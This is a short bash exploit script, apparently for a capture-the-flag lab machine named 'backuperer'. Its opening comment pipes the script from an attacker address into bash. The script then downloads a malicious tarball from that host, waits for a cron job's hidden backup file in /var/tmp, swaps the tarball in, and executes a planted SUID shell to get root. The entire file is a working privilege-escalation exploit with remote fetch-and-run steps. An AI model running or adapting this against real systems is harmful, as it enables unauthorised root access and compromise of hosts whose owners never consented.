#!/bin/bash

# call with: curl http://10.10.14.97:80/backuperer-exploit-shell/exploit.sh | bash
cd /tmp

# assuming http server is running from previous exploit
curl http://10.10.14.97:80/backuperer-exploit-shell/evil.tar.gz -o /tmp/evil.tar.gz

echo "Waiting for cron..."

# wait for backup to appear, then swap
while true; do
    f=$(find /var/tmp -maxdepth 1 -name ".*" -type f 2>/dev/null)
    if [ -n "$f" ]; then
        cp /tmp/evil.tar.gz "$f"
        echo "[+] Swapped $f"
        break
    fi
    sleep 1
done

# try to execute suid shell
while true; do
    if [ -d "/var/tmp/check" ]; then
        exec /var/tmp/check/var/www/html/shell
        break
    fi
    sleep 1
done
